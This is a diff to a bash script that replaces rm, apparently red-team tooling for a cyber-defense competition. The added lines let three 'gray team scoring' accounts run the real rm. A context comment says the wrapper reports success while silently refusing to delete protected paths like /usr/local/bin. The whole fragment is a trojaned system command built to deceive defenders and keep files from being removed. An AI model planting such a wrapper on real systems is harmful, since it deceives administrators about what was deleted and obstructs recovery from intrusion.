@@ -1,6 +1,12 @@
 #!/bin/bash
 REAL_RM="/usr/bin/rm"
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_RM "$@" ;;
+esac
+
+
 # Paths we protect — rm will claim success but do nothing to these
 PROTECTED=(
     "/usr/local/bin"
